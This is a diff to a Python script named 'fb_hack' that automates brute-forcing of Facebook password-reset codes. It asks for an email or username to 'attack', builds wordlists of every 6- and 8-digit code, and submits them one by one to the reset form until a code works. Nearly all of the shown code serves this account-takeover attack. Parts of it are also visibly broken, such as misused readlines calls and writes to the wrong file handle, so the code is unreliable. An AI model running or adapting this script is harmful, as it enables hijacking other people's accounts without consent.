@@ -25,80 +25,21 @@ def setup_browser(self):
     browser.set_handle_refresh(False)
     return browser
 
-def passcode6(pass0):
-  pass1 = int(pass0)
-  pass2 = int(pass0)
-  if pass1 < 10**5 and pass1 > 9999:
-    pass2 = str(pass1)
-    h = ""
-    code = ("0", str(pass2))
-    yo = h.join(code)
-  elif pass1 < 10**4 and pass1 > 999:
-    h = ""
-    code = ("00", str(pass2))
-    yo = h.join(code)
-  elif pass1 < 10**3 and pass1 > 99:
-    h = ""
-    code = ("000", str(pass2))
-    yo = h.join(code)
-  elif pass1 < 10**2 and pass1 > 9:
-    h = ""
-    code = ("0000", str(pass2))
-    yo = h.join(code)
-  elif pass1 < 10 and pass1 >= 0:
-    h = ""
-    code = ("00000", str(pass2))
-    yo = h.join(code)
-  elif pass1 < 0 :
-    pass1 = 999999
-    yo = str(pass1)
-  else:
-    yo = str(pass1)
-  return yo
-
-def passcode8(pass0):
-  pass1 = int(pass0)
-  pass2 = int(pass0)
-  """8"""
-  if pass1 < 10**7 and pass1 > 999999:
-    pass2 = str(pass1)
-    h = ""
-    code = ("0", str(pass2))
-    yo = h.join(code)
-    """7"""
-  elif pass1 < 10**6 and pass1 > 99999:
-    pass2 = str(pass1)
-    h = ""
-    code = ("00", str(pass2))
-    yo = h.join(code)
-  elif pass1 < 10**5 and pass1 > 9999:
-    pass2 = str(pass1)
-    h = ""
-    code = ("000", str(pass2))
-    yo = h.join(code)
-  elif pass1 < 10**4 and pass1 > 999:
-    pass2 = str(pass1)
-    h = ""
-    code = ("0000", str(pass2))
-    yo = h.join(code)
-  elif pass1 < 10**3 and pass1 > 99:
-    pass2 = str(pass1)
-    h = ""
-    code = ("00000", str(pass2))
-    yo = h.join(code)
-  elif pass1 < 10**2 and pass1 > 9:
-    pass2 = str(pass1)
-    h = ""
-    code = ("000000", str(pass2))
-    yo = h.join(code)
-  elif pass1 < 10 and pass1 >= 0:
-    pass2 = str(pass1)
-    h = ""
-    code = ("0000000", str(pass2))
-    yo = h.join(code)
-  else:
-    yo = str(pass1)
-  return yo
+def passcode6():
+  try:
+    f = open("6digits.txt", "a")
+    f.close()
+  except:
+    f = open("6digits.txt", "a+")
+    for combination in itertools.product(range(10), repeat=6):
+        f.write(''.join(map(str, combination)))
+  try:
+    z = open("8digits.txt", "a")
+    z.close()
+  except:
+    z = open("8digits.txt", "a+")
+    for combination in itertools.product(range(10), repeat=8):
+      z.write(''.join(map(str, combination)))
 
 def sleepy(counter):
   x = counter
@@ -106,7 +47,7 @@ def sleepy(counter):
   while x > y:
     x -= 1
     z = x
-    if x <= 9
+    if x <= 9:
       code = ("0", str(z))
       yo = h.join(code)
       x 
@@ -170,26 +111,23 @@ def fb_hack(email, codex):
   check3 = soup.find(string="Please check your email for a message with your code. Your code is 6 numbers long.")
   check4 = soup.find(string="Please check your email for a message with your code. Your code is 6 numbers long.")
   if check1 != test:
-    if int(codex) > 999999:
-      reset = int(codex) - 99000000
-      print(check1)
-    else:
-      print(check1)
-      reset = int(codex)
+    attempt = int(codex)
+    print(check1)
+    f = open("6digits.txt", "r")
+    attempt = int(codex)
     while check1 != test:
       browser.select_form(nr=0)
-      y = passcode6(reset)
+      y = f.readlines(attempt)
+      attempt += 1
       browser.form['n'] = y
       browser.submit()
       print(y, end='\r')
       fail = (y, "failed")
       success = (y, "succeded")
       s = " "
-      reset -= 1
-      reset1 = reset
-      with open("passcoder.txt", "a") as z:
-        z.write(str(reset1))
-        z.close()
+      with open("passcoder.txt", "a+") as z:
+        f.write(str(attempt))
+        f.close()
       response1 = browser.response()
       soup = BeautifulSoup(response1, 'html.parser')
       check1 = soup.find(string="Please check your email for a message with your code. Your code is 6 numbers long.")
@@ -207,10 +145,12 @@ def fb_hack(email, codex):
           print(s.join(success))
   elif check2 != test:
     print(check2)
-    reset = int(codex)
+    attempt = int(codex)
+    f = open("8digits.txt", "r")
     while check2 != check4:
       browser.select_form(nr=0)
-      y = passcode8(reset)
+      y = f.readlines(attempt)
+      attempt += 1
       browser.form['n'] = y
       browser.submit()
       print(str(y), end='\r')
@@ -234,6 +174,7 @@ def fb_hack(email, codex):
         if soup.find(string="password_new") == test:
           print("Password not found")
           print(browser.geturl())
+          print(browser.response())
           browser.close()
         else:
           print(s.join(success))
@@ -244,6 +185,7 @@ def fb_hack(email, codex):
     response1 = browser.response()
     soup = BeautifulSoup(response1, 'html.parser')
     print(browser.geturl())
+    print(response1)
     if soup.find(string="password_new") == test:
       print("Passcode not found")
     elif soup.find(string="password_new") != test:
@@ -251,11 +193,14 @@ def fb_hack(email, codex):
       print(y)
       browser.close()
       reset = int(-1)
-  return reset in reset1, y in passcoder, browser
+  return reset, y, browser
 
 os.system('clear')
-ehack = input('Email address or username to attack:')
-reset = int(input('Code: ') or int(99999999))
+passcode6()
+f = open("emails.txt", "r")
+ehack = input('Email address or username to attack:') or f.readlines(-1)
+f.close()
+reset = int(input('Code: ') or 99999999)
 reset1 = reset
 f = open("emails.txt", "a")
 z = open("passcoder.txt", "a")
@@ -263,4 +208,5 @@ f.write(ehack)
 f.close()
 z.write(str(reset1))
 z.close()
+
 fb_hack(ehack, reset)
